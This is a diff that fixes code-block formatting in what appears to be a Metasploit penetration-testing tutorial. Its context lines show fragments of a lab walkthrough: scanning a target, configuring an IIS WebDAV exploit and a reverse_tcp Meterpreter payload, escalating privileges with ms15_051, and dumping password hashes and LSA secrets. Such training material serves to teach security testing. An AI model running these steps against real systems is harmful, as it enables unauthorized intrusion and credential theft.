@@ -25,8 +25,7 @@ Whenever the Meterpreter Payload is sent and run on the target system, we receiv
 
 #### MSF - Meterpreter Commands
 
-```
-        shellsession
+```shellsession
 meterpreter > help
 
 Core Commands
@@ -107,8 +106,7 @@ We have already delved into the basics of Meterpreter in the Payloads section. N
 
 #### MSF - Scanning Target
 
-```
-        shellsession
+```shellsession
 msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
 
 [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
@@ -160,8 +158,7 @@ We notice it is an under-construction website—nothing web-related to see here.
 
 #### MSF - Searching for Exploit
 
-```
-        shellsession
+```shellsession
 msf6 > search iis_webdav_upload_asp
 
 Matching Modules
@@ -210,8 +207,7 @@ We proceed to set the needed parameters. For now, these would be `LHOST`and `RHO
 
 #### MSF - Configuring Exploit & Payload
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
 
 RHOST => 10.10.10.15
@@ -243,8 +239,7 @@ We proceed further with our exploits. Upon attempting to see which user we are r
 
 #### MSF - Meterpreter Migration
 
-```
-        shellsession
+```shellsession
 meterpreter > getuid
 
 [-] 1055: Operation failed: Access is denied.
@@ -285,8 +280,7 @@ Now that we have established at least some privilege level in the system, it is 
 
 #### MSF - Interacting with the Target
 
-```
-        cmd
+```bat
 c:\Inetpub>dir
 
 dir
@@ -312,8 +306,7 @@ We can easily decide to run the local exploit suggester module, attaching it to 
 
 #### MSF - Session Handling
 
-```
-        shellsession
+```shellsession
 meterpreter > bg
 
 Background session 1? [y/N]  y
@@ -360,8 +353,7 @@ Running the recon module presents us with a multitude of options. Going through 
 
 #### MSF - Privilege Escalation
 
-```
-        shellsession
+```shellsession
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -418,8 +410,7 @@ From here, we can proceed to use the plethora of Meterpreter functionalities. Fo
 
 #### MSF - Dumping Hashes
 
-```
-        shellsession
+```shellsession
 meterpreter > hashdump
 
 Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
@@ -475,8 +466,7 @@ User : Lakis
 
 #### MSF - Meterpreter LSA Secrets Dump
 
-```
-        shellsession
+```shellsession
 meterpreter > lsa_dump_secrets
 
 [+] Running as SYSTEM
